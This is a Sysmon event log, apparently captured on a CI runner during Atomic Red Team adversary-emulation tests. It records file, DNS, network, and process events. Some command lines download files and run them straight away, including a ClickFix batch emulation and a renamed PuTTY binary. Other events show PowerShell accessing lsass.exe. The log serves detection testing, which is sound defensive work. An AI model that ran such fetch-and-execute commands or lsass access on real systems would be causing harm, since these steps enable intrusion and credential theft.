User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:05 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:05.149
ProcessGuid: {f995aebf-62c8-6942-d904-000000000e00}
ProcessId: 8540
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\a.exe
Hashes: SHA256=16CBE40FB24CE2D422AFDDB5A90A5801CED32EF52C22C2FC77B25A90837F28AD
IsExecutable: true
Archived: true"
"12/17/2025 7:59:04 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:04.961
ProcessGuid: {f995aebf-62c8-6942-d904-000000000e00}
ProcessId: 8540
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_nmjhirnd.tdl.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:04 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:04.943
ProcessGuid: {f995aebf-62c8-6942-d904-000000000e00}
ProcessId: 8540
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_nmjhirnd.tdl.ps1
CreationUtcTime: 2025-12-17 07:59:04.943
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:04 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:04.503
ProcessGuid: {f995aebf-62c8-6942-d704-000000000e00}
ProcessId: 7808
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_rugek0iw.fis.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:04 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:04.485
ProcessGuid: {f995aebf-62c8-6942-d704-000000000e00}
ProcessId: 7808
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_rugek0iw.fis.ps1
CreationUtcTime: 2025-12-17 07:59:04.485
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:04 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:04.207
ProcessGuid: {f995aebf-62c7-6942-d504-000000000e00}
ProcessId: 3168
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\PotentiallyUnwanted.exe
Hashes: SHA256=42D6581DD0A2BA9BEC6A40C5B7C85870A8019D7347C9130D24752EC5865F0732
IsExecutable: true
Archived: true"
"12/17/2025 7:59:04 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:04.020
ProcessGuid: {f995aebf-62c7-6942-d504-000000000e00}
ProcessId: 3168
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_elovdlq3.1pl.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:04 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:04.002
ProcessGuid: {f995aebf-62c7-6942-d504-000000000e00}
ProcessId: 3168
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_elovdlq3.1pl.ps1
CreationUtcTime: 2025-12-17 07:59:04.002
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:03 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:03.497
ProcessGuid: {f995aebf-62c7-6942-d304-000000000e00}
ProcessId: 4100
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_sllhnc4k.sp2.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:03 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:03.480
ProcessGuid: {f995aebf-62c7-6942-d304-000000000e00}
ProcessId: 4100
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_sllhnc4k.sp2.ps1
CreationUtcTime: 2025-12-17 07:59:03.479
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:03 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:03.027
ProcessGuid: {f995aebf-62c6-6942-d104-000000000e00}
ProcessId: 1336
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_450lkzgh.ajg.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:03 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:03.009
ProcessGuid: {f995aebf-62c6-6942-d104-000000000e00}
ProcessId: 1336
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_450lkzgh.ajg.ps1
CreationUtcTime: 2025-12-17 07:59:03.009
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:02 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 07:59:02.711
SourceProcessGUID: {f995aebf-62c6-6942-cf04-000000000e00}
SourceProcessId: 6924
SourceThreadId: 10192
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGUID: {f995aebf-5511-6942-0d00-000000000e00}
TargetProcessId: 992
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1410
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+3fba6|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+34fab0|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2cd8fe|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2ccd3f|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2ccc76|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2cbdf0|UNKNOWN(00007FF97C3F0981)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 7:59:02 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:02.515
ProcessGuid: {f995aebf-62c6-6942-cf04-000000000e00}
ProcessId: 6924
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_sghsffcz.k3g.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:02 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:02.497
ProcessGuid: {f995aebf-62c6-6942-cf04-000000000e00}
ProcessId: 6924
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_sghsffcz.k3g.ps1
CreationUtcTime: 2025-12-17 07:59:02.497
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:02 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:02.156
ProcessGuid: {f995aebf-62c6-6942-cd04-000000000e00}
ProcessId: 9952
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_fajox4vx.uba.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:02 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:02.137
ProcessGuid: {f995aebf-62c6-6942-cd04-000000000e00}
ProcessId: 9952
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_fajox4vx.uba.ps1
CreationUtcTime: 2025-12-17 07:59:02.137
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:01 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:01.807
ProcessGuid: {f995aebf-62c5-6942-cb04-000000000e00}
ProcessId: 2904
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_mt2vuwhb.vux.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:01 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:01.788
ProcessGuid: {f995aebf-62c5-6942-cb04-000000000e00}
ProcessId: 2904
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_mt2vuwhb.vux.ps1
CreationUtcTime: 2025-12-17 07:59:01.788
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:01 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:01.140
ProcessGuid: {f995aebf-62c5-6942-c604-000000000e00}
ProcessId: 2468
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ki1gg34s.tcj.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:01 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:01.122
ProcessGuid: {f995aebf-62c5-6942-c604-000000000e00}
ProcessId: 2468
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ki1gg34s.tcj.ps1
CreationUtcTime: 2025-12-17 07:59:01.122
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:58 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:58:56.806
ProcessGuid: {f995aebf-62c0-6942-ba04-000000000e00}
ProcessId: 6376
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:58 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:58:56.810
ProcessGuid: {f995aebf-62c0-6942-ba04-000000000e00}
ProcessId: 6376
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.149
SourceHostname: runnervm8j6r3.o3imerjm4krehdeh0rvc5luiwc.bx.internal.cloudapp.net
SourcePort: 59061
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.110.133
DestinationHostname: cdn-185-199-110-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:58:56 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:56.854
ProcessGuid: {f995aebf-62c0-6942-ba04-000000000e00}
ProcessId: 6376
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\click-fix.bat
CreationUtcTime: 2025-12-17 07:58:56.854
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:56 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:56.596
ProcessGuid: {f995aebf-62c0-6942-ba04-000000000e00}
ProcessId: 6376
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ah5vjcii.ffa.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:56 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:56.579
ProcessGuid: {f995aebf-62c0-6942-ba04-000000000e00}
ProcessId: 6376
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ah5vjcii.ffa.ps1
CreationUtcTime: 2025-12-17 07:58:56.579
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:56 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:56.509
ProcessGuid: {f995aebf-62c0-6942-ba04-000000000e00}
ProcessId: 6376
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {$url = \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/click-fix.bat\""""
$outfile = \""""$env:TEMP\click-fix.bat\""""
Invoke-WebRequest -Uri $url -OutFile $outfile -UseBasicParsing
$process = Start-Process -FilePath $outfile -PassThru -WindowStyle Normal
$process.Id | Out-File \""""$env:TEMP\click-fix-pid.txt\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:56 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:56.110
ProcessGuid: {f995aebf-62c0-6942-b804-000000000e00}
ProcessId: 9344
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_5nzycy3s.zqa.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:56 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:56.092
ProcessGuid: {f995aebf-62c0-6942-b804-000000000e00}
ProcessId: 9344
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_5nzycy3s.zqa.ps1
CreationUtcTime: 2025-12-17 07:58:56.092
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:55 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:55.533
ProcessGuid: {f995aebf-62bf-6942-b604-000000000e00}
ProcessId: 8952
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_hga3wqic.2vz.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:55 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:55.513
ProcessGuid: {f995aebf-62bf-6942-b604-000000000e00}
ProcessId: 8952
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_hga3wqic.2vz.ps1
CreationUtcTime: 2025-12-17 07:58:55.513
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:55 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:58:55.126
ProcessGuid: {f995aebf-62bf-6942-b304-000000000e00}
ProcessId: 1304
Image: C:\Windows\System32\taskkill.exe
ImageLoaded: C:\Windows\System32\dbghelp.dll
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows Image Helper
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: DBGHELP.DLL
Hashes: SHA256=C821A11C26E939E7A2E96C7E68A9FCEADF39AB6873140951902D2A676381D9C9
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:48 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:48.706
ProcessGuid: {f995aebf-62b8-6942-b204-000000000e00}
ProcessId: 6484
Image: C:\Users\RUNNER~1\AppData\Local\Temp\a.exe
FileVersion: Release 0.83 (with embedded help)
Description: SSH, Telnet, Rlogin, and SUPDUP client
Product: PuTTY suite
Company: Simon Tatham
OriginalFileName: PuTTY
CommandLine: ""C:\Users\RUNNER~1\AppData\Local\Temp\a.exe"" 
CurrentDirectory: C:\Windows\System32\WindowsPowerShell\v1.0\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=16CBE40FB24CE2D422AFDDB5A90A5801CED32EF52C22C2FC77B25A90837F28AD
ParentProcessGuid: {f995aebf-62b5-6942-ae04-000000000e00}
ParentProcessId: 6940
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;iwr https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe -outfile $env:TEMP\a.exe;start-process $env:TEMP\a.exe
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:47 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:58:46.076
ProcessGuid: {f995aebf-62b5-6942-ae04-000000000e00}
ProcessId: 6940
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.149
SourceHostname: runnervm8j6r3.o3imerjm4krehdeh0rvc5luiwc.bx.internal.cloudapp.net
SourcePort: 59059
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 93.93.131.124
DestinationHostname: the.earth.li
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:58:47 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:58:45.996
ProcessGuid: {f995aebf-62b5-6942-ae04-000000000e00}
ProcessId: 6940
QueryName: the.earth.li
QueryStatus: 0
QueryResults: ::ffff:93.93.131.124;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:46 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:58:44.936
ProcessGuid: {f995aebf-62b4-6942-ac04-000000000e00}
ProcessId: 2968
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.149
SourceHostname: runnervm8j6r3.o3imerjm4krehdeh0rvc5luiwc.bx.internal.cloudapp.net
SourcePort: 59058
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.110.133
DestinationHostname: cdn-185-199-110-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:58:46 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:58:44.932
ProcessGuid: {f995aebf-62b4-6942-ac04-000000000e00}
ProcessId: 2968
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:46 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:46.413
ProcessGuid: {f995aebf-62b5-6942-ae04-000000000e00}
ProcessId: 6940
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\a.exe
CreationUtcTime: 2025-12-17 07:58:46.413
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:45 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:58:44.060
ProcessGuid: {f995aebf-62b3-6942-aa04-000000000e00}
ProcessId: 5980
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.149
SourceHostname: runnervm8j6r3.o3imerjm4krehdeh0rvc5luiwc.bx.internal.cloudapp.net
SourcePort: 59057
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.110.133
DestinationHostname: cdn-185-199-110-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:58:45 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:45.605
ProcessGuid: {f995aebf-62b5-6942-ae04-000000000e00}
ProcessId: 6940
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_gc2khprx.zmz.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:45 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:45.587
ProcessGuid: {f995aebf-62b5-6942-ae04-000000000e00}
ProcessId: 6940
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_gc2khprx.zmz.ps1
CreationUtcTime: 2025-12-17 07:58:45.587
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:45 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:58:44.057
ProcessGuid: {f995aebf-62b3-6942-aa04-000000000e00}
ProcessId: 5980
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:44 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:58:43.196
ProcessGuid: {f995aebf-62b2-6942-a704-000000000e00}
ProcessId: 9120
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.149
SourceHostname: runnervm8j6r3.o3imerjm4krehdeh0rvc5luiwc.bx.internal.cloudapp.net
SourcePort: 59056
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 81.7.7.163
DestinationHostname: -
DestinationPort: 80
DestinationPortName: http"
"12/17/2025 7:58:44 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:44.719
ProcessGuid: {f995aebf-62b4-6942-ac04-000000000e00}
ProcessId: 2968
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_jxsmahzc.0rg.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:44 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:44.702
ProcessGuid: {f995aebf-62b4-6942-ac04-000000000e00}
ProcessId: 2968
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_jxsmahzc.0rg.ps1
CreationUtcTime: 2025-12-17 07:58:44.702
User: runnervm8j6r3\runneradmin"
